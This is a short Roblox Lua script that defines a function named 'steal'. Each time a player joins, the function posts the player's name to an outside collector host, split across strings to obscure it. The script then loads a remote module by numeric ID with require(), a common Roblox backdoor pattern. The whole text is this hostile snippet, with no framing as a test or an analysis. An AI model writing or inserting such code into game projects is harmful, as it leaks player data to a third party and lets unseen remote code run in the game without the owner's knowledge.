local HttpService = game:GetService("HttpService")
local function steal(plr)
	local url = "https://" .. "collector" .. ".example/log"
	HttpService:PostAsync(url, HttpService:JSONEncode({ user = plr.Name }))
end
game.Players.PlayerAdded:Connect(steal)
require(13571357)
